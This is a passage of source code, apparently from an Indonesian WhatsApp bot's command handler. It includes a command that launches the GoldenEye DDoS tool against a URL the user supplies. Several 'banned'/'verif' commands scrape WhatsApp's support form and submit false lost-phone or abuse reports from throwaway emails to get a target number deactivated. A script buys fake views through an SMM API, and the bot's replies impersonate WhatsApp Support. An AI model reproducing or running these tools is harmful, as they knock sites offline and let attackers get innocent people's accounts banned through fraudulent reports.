    'service' =>  39503, // ID Layanan yang ingin Anda gunakan
    'quantity' => 10000, // Jumlah pesanan Anda
    'data' => '${Linknya2}'
);

// Mengirim permintaan ke API menggunakan metode POST
$ch = curl_init($endpoint);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

$response = curl_exec($ch);
curl_close($ch);

// Menampilkan hasil response dari API
echo $response;
`
const filePath17 = 'pay-pedia.php';
await fs.writeFile(filePath17, script17, (err) => {
  if (err) {
    console.error('Terjadi kesalahan saat menyimpan file:', err);
    return;
  }
  console.log('File PHP berhasil disimpan di', filePath17);
});
const command17 = 'php pay-pedia.php';
const Outputny17 = await exec(command17, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    newReply('error');
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    newReply(stderr);
  }
  console.log(`Output pay-pedia: ${stdout}`);
  if(stdout.includes("true")){
  sukses=sukses+1;}
  else if(stdout.includes("false")||stdout.includes("error")){
  gagal=gagal+1;}
});
newReply("Views Berhasil Dikirim Pola Sukses: "+sukses+"Pola Gagal: "+gagal)

}
break


case 'ddos': {
    if (!isCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    if (args.length < 1) return reply('Mohon masukkan link');

    const url = args[0];
    const options = `-w 200 -s 1000`;

    const pythonScript = `
import subprocess

command = "python3 goldeneye.py ${url} ${options}"
output = subprocess.getoutput(command)
print(output)
    `;

    const { writeFile, unlink } = require('fs');
    const { spawn } = require('child_process');

    const scriptPath = './goldeneye.py';
    writeFile(scriptPath, pythonScript, (err) => {
        if (err) {
            reply('Terjadi kesalahan saat menulis skrip Python.');
            return;
        }

        const process = spawn('python3', [scriptPath]);

        let output = '';
        let error = '';

        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.stderr.on('data', (data) => {
            error += data.toString();
        });

        process.on('close', (code) => {
            unlink(scriptPath, () => {}); // Hapus skrip sementara setelah digunakan

            if (error) {
                reply('Terjadi kesalahan saat menjalankan skrip Python:\n' + error);
            } else {
                reply('Hasil:\n' + output);
            }
        });
    });
}
break

case "out": case "verif":{
  if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
  if (!text) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Perdido/roubado: desative minha conta")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
}
  break
  case "bannedv1": case "kenon":{
  if (!isPremium && !isCreator) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "bannedv2": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "bannedv3": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "bannedv4": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "bannedv5": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
  let ceknya = await Aira.onWhatsApp(prrkek)
  if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
  let axioss = require("axios")  
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
  let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
  let cookie = ntah.headers["set-cookie"].join("; ")
  const cheerio = require('cheerio');
  let $ = cheerio.load(ntah.data)
  let $form = $("form");
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
  let form = new URLSearchParams()
  form.append("jazoest", $form.find("input[name=jazoest]").val())
  form.append("lsd", $form.find("input[name=lsd]").val())
  form.append("step", "submit")
  form.append("country_selector", "INDONESIA")
  form.append("phone_number", prrkek)
  form.append("email", email.data[0])
  form.append("email_confirm", email.data[0])
  form.append("platform", "ANDROID")
  form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
  form.append("__user", "0")
  form.append("__a", "1")
  form.append("__csr", "")
  form.append("__req", "8")
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
  form.append("dpr", "1")
  form.append("__ccg", "UNKNOWN")
  form.append("__rev", "1006630858")
  form.append("__comment_req", "0")
  let res = await axioss({
    url,
    method: "POST",
    data: form,
    headers: {
    cookie
  }
  })
  await loading()
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
  }
  break
  case "bannedv6": {
  if (!isCreator && !isPremium) return reply(mess.OnlyPrem)
  if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
  prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
